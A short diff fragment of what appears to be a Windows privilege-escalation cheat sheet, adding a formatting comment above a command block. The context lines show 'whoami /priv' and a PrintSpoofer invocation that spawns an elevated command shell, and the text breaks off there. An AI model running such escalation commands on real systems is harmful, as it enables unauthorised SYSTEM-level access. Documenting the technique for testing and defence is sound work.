@@ -12,6 +12,7 @@ Used on: **Relevant**
 
 ## Steps
 
+<!-- cmd: windows -->
 ```cmd
 whoami /priv
 PrintSpoofer.exe -i -c cmd
